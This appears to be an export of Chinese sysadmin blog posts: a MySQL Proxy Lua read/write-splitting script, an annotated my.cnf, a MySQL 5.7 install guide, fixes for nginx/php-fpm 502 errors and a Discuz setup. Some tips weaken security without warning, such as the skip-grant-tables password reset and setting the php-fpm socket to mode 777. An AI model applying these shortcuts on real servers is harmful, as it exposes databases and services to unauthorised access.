log.info("server [".. proxy.backends[i].address .."] open new connection") return end -- try to open at least min_idle_connections if least_idle_conns_ndx == 0 or ( cur_idle &lt; min_idle_connections and cur_idle &lt; least_idle_conns ) then least_idle_conns_ndx = i least_idle_conns = cur_idle end end end if least_idle_conns_ndx &gt; 0 then proxy.connection.backend_ndx = least_idle_conns_ndx end if proxy.connection.backend_ndx &gt; 0 then local s = proxy.backends[proxy.connection.backend_ndx] local pool = s.pool local cur_idle = pool.users[""].cur_idle_connections if cur_idle &gt;= min_idle_connections then -- we have 4 idling connections in the pool, that's good enough log.debug("using pooled connection from: " .. proxy.connection.backend_ndx) return proxy.PROXY_IGNORE_RESULT end end -- open a new connection log.info("opening new connection on: " .. proxy.backends[proxy.connection.backend_ndx].address)end----- auth.packet is the packetfunction read_auth_result( auth ) if auth.packet:byte() == proxy.MYSQLD_PACKET_OK then -- 连接正常 proxy.connection.backend_ndx = 0 elseif auth.packet:byte() == proxy.MYSQLD_PACKET_EOF then -- we received either a -- * MYSQLD_PACKET_ERR and the auth failed or -- * MYSQLD_PACKET_EOF which means a OLD PASSWORD (4.0) was sent log.error("(read_auth_result) ... not ok yet"); elseif auth.packet:byte() == proxy.MYSQLD_PACKET_ERR then log.error("auth failed!") endend--- -- read/write splittingfunction read_query( packet ) log.debug("[read_query]") log.debug("authed backend = " .. proxy.connection.backend_ndx) log.debug("used db = " .. proxy.connection.client.default_db) if packet:byte() == proxy.COM_QUIT then proxy.response = &#123; type = proxy.MYSQLD_PACKET_OK, &#125; return proxy.PROXY_SEND_RESULT end if proxy.connection.backend_ndx == 0 then local is_read=(string.upper(packet:sub(2))):match("^SELECT") local target_type=proxy.BACKEND_TYPE_RW if is_read then target_type=proxy.BACKEND_TYPE_RO end for i = 1, #proxy.backends do local s = proxy.backends[i] local pool = s.pool local cur_idle = pool.users[proxy.connection.client.username].cur_idle_connections if cur_idle &gt; 0 and s.state ~= proxy.BACKEND_STATE_DOWN and s.type == target_type then proxy.connection.backend_ndx = i break end end end -- sync the client-side default_db with the server-side default_db if proxy.connection.server and proxy.connection.client.default_db ~= proxy.connection.server.default_db then local server_db=proxy.connection.server.default_db local client_db=proxy.connection.client.default_db local default_db= (#client_db &gt; 0) and client_db or server_db if #default_db &gt; 0 then proxy.queries:append(2, string.char(proxy.COM_INIT_DB) .. default_db) proxy.queries:append(2, string.char(proxy.COM_QUERY) .. "set names '" .. encoding .."'") log.info("change database to " .. default_db); end end if proxy.connection.backend_ndx &gt; 0 then log.debug("Query[" .. packet:sub(2) .. "] Target is [" .. proxy.backends[proxy.connection.backend_ndx].address .."]") end proxy.queries:append(1, packet) return proxy.PROXY_SEND_QUERYend----- as long as we are in a transaction keep the connection-- otherwise release it so another client can use itfunction read_query_result( inj ) local res = assert(inj.resultset) local flags = res.flags if inj.id ~= 1 then -- ignore the result of the USE &lt;default_db&gt; return proxy.PROXY_IGNORE_RESULT end is_in_transaction = flags.in_trans if flags.in_trans then transaction_flags[proxy.connection.server.thread_id] = transaction_flags[proxy.connection.server.thread_id] + 1 elseif inj.query:sub(2):lower():match("^%s*commit%s*$") or inj.query:sub(2):lower():match("^%s*rollback%s*$") then transaction_flags[proxy.connection.server.thread_id] = transaction_flags[proxy.connection.server.thread_id] - 1 if transaction_flags[proxy.connection.server.thread_id] &lt; 0 then transaction_flags[proxy.connection.server.thread_id] = 0 end end log.debug("transaction res : " .. tostring(transaction_flags[proxy.connection.server.thread_id])); if transaction_flags[proxy.connection.server.thread_id]==0 or transaction_flags[proxy.connection.server.thread_id] == nil then -- isnot in a transaction, need to release the backend proxy.connection.backend_ndx = 0 endend--- -- close the connections if we have enough connections in the pool---- @return nil - close connection -- IGNORE_RESULT - store connection in the poolfunction disconnect_client() log.debug("[disconnect_client]") if proxy.connection.backend_ndx == 0 then for i = 1, #proxy.backends do local s = proxy.backends[i] local pool = s.pool local cur_idle = pool.users[proxy.connection.client.username].cur_idle_connections if s.state ~= proxy.BACKEND_STATE_DOWN and cur_idle &gt; max_idle_connections then -- try to disconnect a backend proxy.connection.backend_ndx = i log.info("[".. proxy.backends[i].address .."] closing connection, idling: " .. cur_idle) return end end return proxy.PROXY_IGNORE_RESULT endend]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL性能调优my.cnf详解]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F7.%20MySQL%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98my.cnf%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[MySQL性能调优my.cnf详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提供一个MySQL 5.6版本适合在1GB内存VPS上的my.cnf配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990[client]port = 3306socket = /tmp/mysql.sock[mysqld]port = 3306socket = /tmp/mysql.sockbasedir = /usr/local/mysqldatadir = /data/mysqlpid-file = /data/mysql/mysql.piduser = mysqlbind-address = 0.0.0.0server-id = 1skip-name-resolve#skip-networkingback_log = 600max_connections = 1000max_connect_errors = 6000open_files_limit = 65535table_open_cache = 128 max_allowed_packet = 4Mbinlog_cache_size = 1Mmax_heap_table_size = 8Mtmp_table_size = 16Mread_buffer_size = 2Mread_rnd_buffer_size = 8Msort_buffer_size = 8Mjoin_buffer_size = 8Mkey_buffer_size = 4Mthread_cache_size = 8query_cache_size = 8Mquery_cache_limit = 2Mft_min_word_len = 4log_bin = mysql-binbinlog_format = mixedexpire_logs_days = 30log_error = /data/mysql/mysql-error.logslow_query_log = 1long_query_time = 1slow_query_log_file = /data/mysql/mysql-slow.logperformance_schema = 0explicit_defaults_for_timestamp#lower_case_table_names = 1skip-external-lockingdefault_storage_engine = InnoDB#default-storage-engine = MyISAMinnodb_file_per_table = 1innodb_open_files = 500innodb_buffer_pool_size = 64Minnodb_write_io_threads = 4innodb_read_io_threads = 4innodb_thread_concurrency = 0innodb_purge_threads = 1innodb_flush_log_at_trx_commit = 2innodb_log_buffer_size = 2Minnodb_log_file_size = 32Minnodb_log_files_in_group = 3innodb_max_dirty_pages_pct = 90innodb_lock_wait_timeout = 120bulk_insert_buffer_size = 8Mmyisam_sort_buffer_size = 8Mmyisam_max_sort_file_size = 10Gmyisam_repair_threads = 1interactive_timeout = 28800wait_timeout = 28800[mysqldump]quickmax_allowed_packet = 16M[myisamchk]key_buffer_size = 8Msort_buffer_size = 8Mread_buffer = 4Mwrite_buffer = 4M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;详细说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221[client] port = 3306 socket = /tmp/mysql.sock [mysqld] port = 3306 socket = /tmp/mysql.sock basedir = /usr/local/mysql datadir = /data/mysql pid-file = /data/mysql/mysql.pid user = mysql bind-address = 0.0.0.0 server-id = 1 #表示是本机的序号为1,一般来讲就是master的意思 skip-name-resolve # 禁止MySQL对外部连接进行DNS解析，使用这一选项可以消除MySQL进行DNS解析的时间。但需要注意，如果开启该选项， # 则所有远程主机连接授权都要使用IP地址方式，否则MySQL将无法正常处理连接请求 #skip-networking back_log = 600 # MySQL能有的连接数量。当主要MySQL线程在一个很短时间内得到非常多的连接请求，这就起作用， # 然后主线程花些时间(尽管很短)检查连接并且启动一个新线程。back_log值指出在MySQL暂时停止回答新请求之前的短时间内多少个请求可以被存在堆栈中。 # 如果期望在一个短时间内有很多连接，你需要增加它。也就是说，如果MySQL的连接数据达到max_connections时，新来的请求将会被存在堆栈中， # 以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量超过back_log，将不被授予连接资源。 # 另外，这值（back_log）限于您的操作系统对到来的TCP/IP连接的侦听队列的大小。 # 你的操作系统在这个队列大小上有它自己的限制（可以检查你的OS文档找出这个变量的最大值），试图设定back_log高于你的操作系统的限制将是无效的。 max_connections = 1000 # MySQL的最大连接数，如果服务器的并发连接请求量比较大，建议调高此值，以增加并行连接数量，当然这建立在机器能支撑的情况下，因为如果连接数越多，介于MySQL会为每个连接提供连接缓冲区，就会开销越多的内存，所以要适当调整该值，不能盲目提高设值。可以过'conn%'通配符查看当前状态的连接数量，以定夺该值的大小。 max_connect_errors = 6000 # 对于同一主机，如果有超出该参数值个数的中断错误连接，则该主机将被禁止连接。如需对该主机进行解禁，执行：FLUSH HOST。 open_files_limit = 65535 # MySQL打开的文件描述符限制，默认最小1024;当open_files_limit没有被配置的时候，比较max_connections*5和ulimit -n的值，哪个大用哪个， # 当open_file_limit被配置的时候，比较open_files_limit和max_connections*5的值，哪个大用哪个。 table_open_cache = 128 # MySQL每打开一个表，都会读入一些数据到table_open_cache缓存中，当MySQL在这个缓存中找不到相应信息时，才会去磁盘上读取。默认值64 # 假定系统有200个并发连接，则需将此参数设置为200*N(N为每个连接所需的文件描述符数目)； # 当把table_open_cache设置为很大时，如果系统处理不了那么多文件描述符，那么就会出现客户端失效，连接不上 max_allowed_packet = 4M # 接受的数据包大小；增加该变量的值十分安全，这是因为仅当需要时才会分配额外内存。例如，仅当你发出长查询或MySQLd必须返回大的结果行时MySQLd才会分配更多内存。 # 该变量之所以取较小默认值是一种预防措施，以捕获客户端和服务器之间的错误信息包，并确保不会因偶然使用大的信息包而导致内存溢出。 binlog_cache_size = 1M # 一个事务，在没有提交的时候，产生的日志，记录到Cache中；等到事务提交需要提交的时候，则把日志持久化到磁盘。默认binlog_cache_size大小32K max_heap_table_size = 8M # 定义了用户可以创建的内存表(memory table)的大小。这个值用来计算内存表的最大行数值。这个变量支持动态改变 tmp_table_size = 16M # MySQL的heap（堆积）表缓冲大小。所有联合在一个DML指令内完成，并且大多数联合甚至可以不用临时表即可以完成。 # 大多数临时表是基于内存的(HEAP)表。具有大的记录长度的临时表 (所有列的长度的和)或包含BLOB列的表存储在硬盘上。 # 如果某个内部heap（堆积）表大小超过tmp_table_size，MySQL可以根据需要自动将内存中的heap表改为基于硬盘的MyISAM表。还可以通过设置tmp_table_size选项来增加临时表的大小。也就是说，如果调高该值，MySQL同时将增加heap表的大小，可达到提高联接查询速度的效果 read_buffer_size = 2M # MySQL读入缓冲区大小。对表进行顺序扫描的请求将分配一个读入缓冲区，MySQL会为它分配一段内存缓冲区。read_buffer_size变量控制这一缓冲区的大小。 # 如果对表的顺序扫描请求非常频繁，并且你认为频繁扫描进行得太慢，可以通过增加该变量值以及内存缓冲区大小提高其性能 read_rnd_buffer_size = 8M # MySQL的随机读缓冲区大小。当按任意顺序读取行时(例如，按照排序顺序)，将分配一个随机读缓存区。进行排序查询时， # MySQL会首先扫描一遍该缓冲，以避免磁盘搜索，提高查询速度，如果需要排序大量数据，可适当调高该值。但MySQL会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大 sort_buffer_size = 8M # MySQL执行排序使用的缓冲大小。如果想要增加ORDER BY的速度，首先看是否可以让MySQL使用索引而不是额外的排序阶段。 # 如果不能，可以尝试增加sort_buffer_size变量的大小 join_buffer_size = 8M # 联合查询操作所能使用的缓冲区大小，和sort_buffer_size一样，该参数对应的分配内存也是每连接独享 thread_cache_size = 8 # 这个值（默认8）表示可以重新利用保存在缓存中线程的数量，当断开连接时如果缓存中还有空间，那么客户端的线程将被放到缓存中， # 如果线程重新被请求，那么请求将从缓存中读取,如果缓存中是空的或者是新的请求，那么这个线程将被重新创建,如果有很多新的线程， # 增加这个值可以改善系统性能.通过比较Connections和Threads_created状态的变量，可以看到这个变量的作用。(–&gt;表示要调整的值) # 根据物理内存设置规则如下： # 1G —&gt; 8 # 2G —&gt; 16 # 3G —&gt; 32 # 大于3G —&gt; 64 query_cache_size = 8M #MySQL的查询缓冲大小（从4.0.1开始，MySQL提供了查询缓冲机制）使用查询缓冲，MySQL将SELECT语句和查询结果存放在缓冲区中， # 今后对于同样的SELECT语句（区分大小写），将直接从缓冲区中读取结果。根据MySQL用户手册，使用查询缓冲最多可以达到238%的效率。 # 通过检查状态值'Qcache_%'，可以知道query_cache_size设置是否合理：如果Qcache_lowmem_prunes的值非常大，则表明经常出现缓冲不够的情况， # 如果Qcache_hits的值也非常大，则表明查询缓冲使用非常频繁，此时需要增加缓冲大小；如果Qcache_hits的值不大，则表明你的查询重复率很低， # 这种情况下使用查询缓冲反而会影响效率，那么可以考虑不用查询缓冲。此外，在SELECT语句中加入SQL_NO_CACHE可以明确表示不使用查询缓冲 query_cache_limit = 2M #指定单个查询能够使用的缓冲区大小，默认1M key_buffer_size = 4M #指定用于索引的缓冲区大小，增加它可得到更好处理的索引(对所有读和多重写)，到你能负担得起那样多。如果你使它太大， # 系统将开始换页并且真的变慢了。对于内存在4GB左右的服务器该参数可设置为384M或512M。通过检查状态值Key_read_requests和Key_reads， # 可以知道key_buffer_size设置是否合理。比例key_reads/key_read_requests应该尽可能的低， # 至少是1:100，1:1000更好(上述状态值可以使用SHOW STATUS LIKE 'key_read%'获得)。注意：该参数值设置的过大反而会是服务器整体效率降低 ft_min_word_len = 4 # 分词词汇最小长度，默认4 transaction_isolation = REPEATABLE-READ # MySQL支持4种事务隔离级别，他们分别是： # READ-UNCOMMITTED, READ-COMMITTED, REPEATABLE-READ, SERIALIZABLE. # 如没有指定，MySQL默认采用的是REPEATABLE-READ，ORACLE默认的是READ-COMMITTED log_bin = mysql-bin binlog_format = mixed expire_logs_days = 30 #超过30天的binlog删除 log_error = /data/mysql/mysql-error.log #错误日志路径 slow_query_log = 1 long_query_time = 1 #慢查询时间 超过1秒则为慢查询 slow_query_log_file = /data/mysql/mysql-slow.log performance_schema = 0 explicit_defaults_for_timestamp #lower_case_table_names = 1 #不区分大小写 skip-external-locking #MySQL选项以避免外部锁定。该选项默认开启 default-storage-engine = InnoDB #默认存储引擎 innodb_file_per_table = 1 # InnoDB为独立表空间模式，每个数据库的每个表都会生成一个数据空间 # 独立表空间优点： # 1．每个表都有自已独立的表空间。 # 2．每个表的数据和索引都会存在自已的表空间中。 # 3．可以实现单表在不同的数据库中移动。 # 4．空间可以回收（除drop table操作处，表空不能自已回收） # 缺点： # 单表增加过大，如超过100G # 结论： # 共享表空间在Insert操作上少有优势。其它都没独立表空间表现好。当启用独立表空间时，请合理调整：innodb_open_files innodb_open_files = 500 # 限制Innodb能打开的表的数据，如果库里的表特别多的情况，请增加这个。这个值默认是300 innodb_buffer_pool_size = 64M # InnoDB使用一个缓冲池来保存索引和原始数据, 不像MyISAM. # 这里你设置越大,你在存取表里面数据时所需要的磁盘I/O越少. # 在一个独立使用的数据库服务器上,你可以设置这个变量到服务器物理内存大小的80% # 不要设置过大,否则,由于物理内存的竞争可能导致操作系统的换页颠簸. # 注意在32位系统上你每个进程可能被限制在 2-3.5G 用户层面内存限制, # 所以不要设置的太高. innodb_write_io_threads = 4 innodb_read_io_threads = 4 # innodb使用后台线程处理数据页上的读写 I/O(输入输出)请求,根据你的 CPU 核数来更改,默认是4 # 注:这两个参数不支持动态改变,需要把该参数加入到my.cnf里，修改完后重启MySQL服务,允许值的范围从 1-64 innodb_thread_concurrency = 0 # 默认设置为 0,表示不限制并发数，这里推荐设置为0，更好去发挥CPU多核处理能力，提高并发量 innodb_purge_threads = 1 # InnoDB中的清除操作是一类定期回收无用数据的操作。在之前的几个版本中，清除操作是主线程的一部分，这意味着运行时它可能会堵塞其它的数据库操作。 # 从MySQL5.5.X版本开始，该操作运行于独立的线程中,并支持更多的并发数。用户可通过设置innodb_purge_threads配置参数来选择清除操作是否使用单 # 独线程,默认情况下参数设置为0(不使用单独线程),设置为 1 时表示使用单独的清除线程。建议为1 innodb_flush_log_at_trx_commit = 2 # 0：如果innodb_flush_log_at_trx_commit的值为0,log buffer每秒就会被刷写日志文件到磁盘，提交事务的时候不做任何操作（执行是由mysql的master thread线程来执行的。 # 主线程中每秒会将重做日志缓冲写入磁盘的重做日志文件(REDO LOG)中。不论事务是否已经提交）默认的日志文件是ib_logfile0,ib_logfile1 # 1：当设为默认值1的时候，每次提交事务的时候，都会将log buffer刷写到日志。 # 2：如果设为2,每次提交事务都会写日志，但并不会执行刷的操作。每秒定时会刷到日志文件。要注意的是，并不能保证100%每秒一定都会刷到磁盘，这要取决于进程的调度。 # 每次事务提交的时候将数据写入事务日志，而这里的写入仅是调用了文件系统的写入操作，而文件系统是有 缓存的，所以这个写入并不能保证数据已经写入到物理磁盘 # 默认值1是为了保证完整的ACID。当然，你可以将这个配置项设为1以外的值来换取更高的性能，但是在系统崩溃的时候，你将会丢失1秒的数据。 # 设为0的话，mysqld进程崩溃的时候，就会丢失最后1秒的事务。设为2,只有在操作系统崩溃或者断电的时候才会丢失最后1秒的数据。InnoDB在做恢复的时候会忽略这个值。 # 总结 # 设为1当然是最安全的，但性能页是最差的（相对其他两个参数而言，但不是不能接受）。如果对数据一致性和完整性要求不高，完全可以设为2，如果只最求性能，例如高并发写的日志服务器，设为0来获得更高性能 innodb_log_buffer_size = 2M # 此参数确定些日志文件所用的内存大小，以M为单位。缓冲区更大能提高性能，但意外的故障将会丢失数据。MySQL开发人员建议设置为1－8M之间 innodb_log_file_size = 32M # 此参数确定数据日志文件的大小，更大的设置可以提高性能，但也会增加恢复故障数据库所需的时间 innodb_log_files_in_group = 3 # 为提高性能，MySQL可以以循环方式将日志文件写到多个文件。推荐设置为3 innodb_max_dirty_pages_pct = 90 # innodb主线程刷新缓存池中的数据，使脏数据比例小于90% innodb_lock_wait_timeout = 120 # InnoDB事务在被回滚之前可以等待一个锁定的超时秒数。InnoDB在它自己的锁定表中自动检测事务死锁并且回滚事务。InnoDB用LOCK TABLES语句注意到锁定设置。默认值是50秒 bulk_insert_buffer_size = 8M # 批量插入缓存大小， 这个参数是针对MyISAM存储引擎来说的。适用于在一次性插入100-1000+条记录时， 提高效率。默认值是8M。可以针对数据量的大小，翻倍增加。 myisam_sort_buffer_size = 8M # MyISAM设置恢复表之时使用的缓冲区的尺寸，当在REPAIR TABLE或用CREATE INDEX创建索引或ALTER TABLE过程中排序 MyISAM索引分配的缓冲区 myisam_max_sort_file_size = 10G # 如果临时文件会变得超过索引，不要使用快速排序索引方法来创建一个索引。注释：这个参数以字节的形式给出 myisam_repair_threads = 1 # 如果该值大于1，在Repair by sorting过程中并行创建MyISAM表索引(每个索引在自己的线程内) interactive_timeout = 28800 # 服务器关闭交互式连接前等待活动的秒数。交互式客户端定义为在mysql_real_connect()中使用CLIENT_INTERACTIVE选项的客户端。默认值：28800秒（8小时） wait_timeout = 28800 # 服务器关闭非交互连接之前等待活动的秒数。在线程启动时，根据全局wait_timeout值或全局interactive_timeout值初始化会话wait_timeout值， # 取决于客户端类型(由mysql_real_connect()的连接选项CLIENT_INTERACTIVE定义)。参数默认值：28800秒（8小时） # MySQL服务器所支持的最大连接数是有上限的，因为每个连接的建立都会消耗内存，因此我们希望客户端在连接到MySQL Server处理完相应的操作后， # 应该断开连接并释放占用的内存。如果你的MySQL Server有大量的闲置连接，他们不仅会白白消耗内存，而且如果连接一直在累加而不断开， # 最终肯定会达到MySQL Server的连接上限数，这会报'too many connections'的错误。对于wait_timeout的值设定，应该根据系统的运行情况来判断。 # 在系统运行一段时间后，可以通过show processlist命令查看当前系统的连接状态，如果发现有大量的sleep状态的连接进程，则说明该参数设置的过大， # 可以进行适当的调整小些。要同时设置interactive_timeout和wait_timeout才会生效。 [mysqldump] quick max_allowed_packet = 16M #服务器发送和接受的最大包长度 [myisamchk] key_buffer_size = 8M sort_buffer_size = 8M read_buffer = 4M write_buffer = 4M]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL5.7 二进制源码包安装]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F4.%20MySQL5.7%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BA%90%E7%A0%81%E5%8C%85%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[MySQL5.7 二进制源码包安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般平时安装MySQL都是源码包安装的，但是由于它的编译需要很长的时间，所以建议安装二进制免编译包。可以到MySQL官方网站去下载，也可以到comsenz官方网站下载，还有各大镜像站下载。 下载安装包，并安装依赖包12wget http://mirrors.sohu.com/mysql/MySQL-5.7/mysql-5.7.12-linux-glibc2.5-x86_64.tar.gzyum -y install gcc-c++ ncurses-devel cmake make perl gcc autoconf automake zlib libxml libgcrypt libtool bison 解压12tar zxvf mysql-5.7.12-linux-glibc2.5-x86_64.tar.gzmv mysql-5.7.12-linux-glibc2.5-x86_64 /usr/local/mysql 初始化12345useradd -M -s /sbin/nologin mysql mkdir -p /data/mysqlchown mysql /data/mysqlcd /usr/local/mysql./bin/mysqld --initialize --user=mysql --datadir=/data/mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这一步最后一行会有一个提示 1[Note] A temporary password is generated for root@localhost: B*s1i(*,kXwg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后面的字符串为root密码 1./bin/mysql_ssl_rsa_setup --datadir=/data/mysql 拷贝配置文件和启动脚本1234567891011cp support-files/my-default.cnf /etc/my.cnf vim /etc/my.cnf //编辑或者修改basedir = /usr/local/mysqldatadir = /data/mysqlport = 3306socket = /tmp/mysql.sockcp support-files/mysql.server /etc/init.d/mysqldvi /etc/init.d/mysqld //编辑或者修改basedir=/usr/local/mysqldatadir=/data/mysql 启动服务1/etc/init.d/mysqld start 设置root密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用初始化密码登录 12/usr/local/mysql/bin/mysql -uroot -p'B*s1i(*,kXwg' //进入后直接设置密码mysql&gt;set password = password('mypass'); //一定要设置一下新密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出来，再使用新的密码登录就可以了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一种情况，就是不知道初始化密码 1vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 [mysql] 下面增加一行 1skip-grant-tables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启mysql 1/etc/init.d/mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时登录mysql不需要密码，进入mysql重新设置root密码 12/usr/local/mysql/bin/mysql -uroot mysql&gt; update user set authentication_string=password('123333') where user='root'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出来后，更改my.cnf，去掉刚加的skip-grant-tables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再次重启mysql 1/etc/init.d/mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时就可以使用新的密码登录了。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LNMP常见的502错误]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F12.%20LNMP%E5%B8%B8%E8%A7%81%E7%9A%84502%E9%94%99%E8%AF%AF%2F</url>
    <content type="text"><![CDATA[LNMP常见的502错误&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于 LNMP 来说，最常见的问题就是502问题了。配置完环境后，一访问网站直接提示“502 Bad Gateway”。出现502的原因大致分为两种 配置错误 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为nginx找不到php-fpm了，所以报错，一般是fastcgi_pass后面的路径配置错误了，后面可以是socket或者是ip:port &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 nginx 中有配置 123456location ~ \.php$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果把 fastcgi_pass 后面指定路径配置错了，那么就会出现502错误，因为 nginx 找不到 php-fpm 了。fastcgi_pass 后面可以跟 socket 也可以跟 ip：port，默认监听地址为 127.0.0.1：9000. 资源耗尽 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lnmp架构在处理php时，nginx直接调取后端的php-fpm服务，如果nginx的请求量偏高，我们又没有给php-fpm配置足够的子进程，那么php-fpm就会资源耗尽，一旦资源耗尽nginx找不到php-fpm就会出现502错误， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方案： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;去调整php-fpm.conf中的pm.max_children数值，使其增加，但是也不能无限增加，毕竟资源有限，一般4G内存机器如果跑php-fpm和nginx，不跑mysql可以设置为150，8G为300以此类推 除了上面的两种错误还有其他的原因，很少有，我们可以借助nginx的错误日志来进行排查 1vim /usr/local/nginx/logs/nginx_error.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们也可以给日志定义级别vim/usr/local/nginx/conf/nginx.conf 找到error_log，默认是crit最严谨的就行，也可以改成debug显示的信息最全面，但是很容易撑爆我们的磁盘。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先我们需要让浏览器进行访问 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改nginx的配置文件 123456789101112131415161718[root@wqslinux ~]# vim/usr/local/nginx/conf/vhosts/111.conf server&#123; listen 80; server_name www.111.com; #域名地址 index index.html index.htm index.php; root /data/www/; location ~ \.php$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/www.sock; //修改sock #fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www$fastcgi_script_name; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查语法是否正常 1[root@wqslinux ~]#/usr/local/nginx/sbin/nginx -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新加载配置文件 12[root@wqslinux ~]# /usr/local/nginx/sbin/nginx-s reload[root@wqslinux ~]# /etc/init.d/nginx reload &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查nginx是那个用户跑的 1[root@wqslinux ~]# ps aux |grep nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑php-fpm文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们要在这个php-fpm文件里面设置nginx的用户主，跟组这样才不会显示502 12345678910111213141516171819[root@wqslinux ~]# vim/usr/local/php/etc/php-fpm.conf[global]pid = /usr/local/php/var/run/php-fpm.piderror_log =/usr/local/php/var/log/php-fpm.log[www]listen = /tmp/www.sockuser = php-fpmgroup = php-fpmlisten.owner = nobody //定义属主listen.group = nobody //定义属组pm = dynamicpm.max_children = 50pm.start_servers = 20pm.min_spare_servers = 5pm.max_spare_servers = 35pm.max_requests = 500rlimit_files = 1024 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置完之后重启php-fpm 1[root@wqslinux ~]# /etc/init.d/php-fpm restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ps： 再补充一个，是近期遇到的问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种情况下，使用的是socket，版本高于5.4（含5.4） 默认监听的socket文件权限是所有者只读，属组和其他用户没有任何权限。所以，nginx的启动用户（咱们配置的是 nobody）就没有办法去读这个socket文件，最终导致502，这个问题可以在nginx的错误 日志中发现。解决办法很简单，上面给出的配置文件中就有避免这个问题的配置。 12listen.owner = nobody #定义属主listen.group = nobody #定义属组 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两个配置就是定义socket的属主和属组是谁。除了这个还有一种方法 1listen.mode = 777 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样nobody也可以有读取权限了。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LNMP安装 Discuz！]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F13.%20LNMP%E5%AE%89%E8%A3%85%20Discuz%EF%BC%81%2F</url>
    <content type="text"><![CDATA[LNMP安装 Discuz！1.下载 discuz！123456[root@lnmp ~]# mkdir /data/www[root@lnmp ~]# cd /data/www[root@lnmp www]# wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_GBK.zip[root@lnmp www]# unzip Discuz_X3.2_SC_GBK.zip[root@lnmp www]# mv upload/* . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删掉其他文件和压缩包 1[root@lnmp www]# rm -rf readme/ utility/ upload/ Discuz_X3.2_SC_GBK.zip 2.配置第一个虚拟机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑配置文件 /usr/local/nginx/conf/vhosts/123.conf 1vim /usr/local/nginx/conf/vhosts/123.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567891011121314151617181920server&#123; listen 80; server_name 123.com; index index.html index.htm index.php; root /data/www; location ~ .*admin\.php$ &#123; auth_basic "yanyi auth"; auth_basic_user_file /usr/local/nginx/conf/.htpasswd; &#125; location ~ \.php$ &#123; include fastcgi_params; #fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www$fastcgi_script_name; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存退出后，检查配置有没错误： 123[root@lnmp www]# service nginx configtest nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 